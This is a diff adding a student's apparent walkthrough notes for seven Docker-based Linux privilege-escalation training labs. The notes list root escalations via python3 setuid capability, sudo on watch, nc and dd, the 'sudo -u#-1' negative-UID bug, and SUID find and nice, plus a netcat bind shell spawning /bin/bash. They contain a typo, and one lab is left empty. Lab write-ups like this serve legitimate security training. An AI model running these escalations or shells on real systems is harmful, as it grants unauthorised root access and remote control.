@@ -1,0 +1,66 @@
+commands for cueh labs 
+    - sudo apt update
+    - sudo apt install docker.io
+    - sudo apt install docker-compose
+    - git clone https://github.com/amr1tpang3n1/Batch29-Prives-Lab_cueh
+    - cd [directory of lab]
+    - sudo docker-compose up
+
+    assuming flag for all machines is in /root/root.txt
+
+CUEH Lab 1 (capabilities)    
+    * ls -li
+        # python3 file is there
+    * getcap python3 
+        # setuid capability is set there
+    * ./python3 
+        # [in python terminal]
+    * import os 
+    * os.setuid(0)
+    * os.ssytem("/bin/bash")
+        # you get access to root shell 
+    * cat /root/root.txt
+
+CUEH Lab 2 (sudo)
+    * sudo -l 
+        # sudo permission is given to /usr/bin/watch
+    * sudo watch cat /root/root.txt 
+
+CUEH Lab 3
+    * sudo -l 
+        # sudo permission is given to /bin/nc but as user leman
+    * sudo -u leman nc -lp [port number] -e /bin/bash
+        {go to another terminal}
+    * nc [ip of machine] [port number]
+        {get access to leman user}
+    * sudo -l
+        # sudo permission is given to /bin/dd 
+    * sudo dd if=/root/root.txt of=[any filename]
+    * cat [filename]
+
+CUEH Lab 4
+    * sudo -l 
+        # idk what this means in this one, but we use setfacl to set perms 
+    * sudo --version
+        # there's a bug with this version and previous ones that accepts negative userid as sudo 
+    * sudo -u#-1 setfacl -m u:cueh:rwx /root
+    * sudo -u#-1 setfacl -m u:cueh:rwx /root/root.txt 
+        # now cueh gets perms to access the flag file 
+    * cat /root/root.txt
+
+CUEH Lab 5 (suid)
+    # first we find the commands that have suid set
+    * find / -perm /4000 2>/dev/null
+        # here we can use find to execute any command, for this the following steps are taken 
+    * touch [filename]
+        # for later use 
+    * find [filename] -exec cat /root/root.txt \; 
+        # executes the command as root for every file it finds with the name 
+
+CUEH Lab 6 
+    [no idea]
+
+CUEH Lab 7 
+    * find / -perm /4000 2>/dev/null
+        # suid is set in nice command
+    * nice cat /root/root.txt 
